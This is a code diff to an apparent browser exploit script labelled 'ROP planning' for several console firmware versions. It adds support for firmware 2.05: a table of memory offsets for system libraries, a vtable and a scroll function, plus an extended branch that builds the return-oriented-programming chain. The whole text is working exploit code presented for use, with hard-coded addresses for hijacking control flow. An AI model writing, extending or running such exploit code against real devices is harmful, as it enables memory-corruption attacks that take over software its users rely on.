@@ -1,5 +1,5 @@
 /*
-    ROP planning (Firmware 2.02, 2.12, 3.00, 3.01, 3.15 and 3.18)
+    ROP planning (Firmware 2.02, 2.05, 2.12, 3.00, 3.01, 3.15 and 3.18)
 */
 
 /*
@@ -13,6 +13,17 @@ function defineOffsets()
 				scelibcentry_off: 0x68e27c, 
 				scelibnetentry_off: 0x68e248,
 				scekernentry_off: 0x68e258,
+				scekernbase_off: 0x93dd,
+				scelibcbase_off: 0xc9ad,
+				scelibnetbase_off: 0x2aed,
+				elementvtable_off: -0x68,
+				setscrollleft_off: 0x5b
+			},
+		v2_05:{
+				scewkbase_off : 0x373a93,
+				scelibcentry_off: 0x68e324, 
+				scelibnetentry_off: 0x68e2f0,
+				scekernentry_off: 0x68e300,
 				scekernbase_off: 0x93dd,
 				scelibcbase_off: 0xc9ad,
 				scelibnetbase_off: 0x2aed,
@@ -147,9 +158,9 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 			
 			var retval = allocate_tmp(0x4);
 
-			if (version == "v2_02")
+			if ((version == "v2_02") || (version == "v2_05"))
 			{
-				// ROP chain for FW 2.02
+				// ROP chain for FWs 2.02 and 2.05
 				var r0values = allocate_tmp(0x10 * 4);
 				var r2values = allocate_tmp(0x10 * 4);
 				var r2values_4 = allocate_tmp(0x10 * 4);
